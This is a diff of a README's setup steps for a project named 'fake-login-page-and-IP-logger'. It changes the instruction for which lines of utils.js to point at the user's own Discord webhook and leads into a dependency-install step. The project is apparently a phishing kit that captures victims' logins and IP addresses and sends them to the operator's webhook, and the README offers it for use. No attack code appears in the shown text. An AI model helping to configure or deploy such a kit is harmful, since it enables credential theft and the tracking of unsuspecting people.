@@ -27,7 +27,7 @@ cd fake-login-page-and-IP-logger
 ```
 ### 2. Edit files
 ```bash
-* edit lines 41, 86 and 170 in utils.js to your discord webhook
+* edit lines 41, 86, 170, 228 in utils.js to your discord webhook
 ```
 ### 3. Install dependencies
 **3.1. python3**
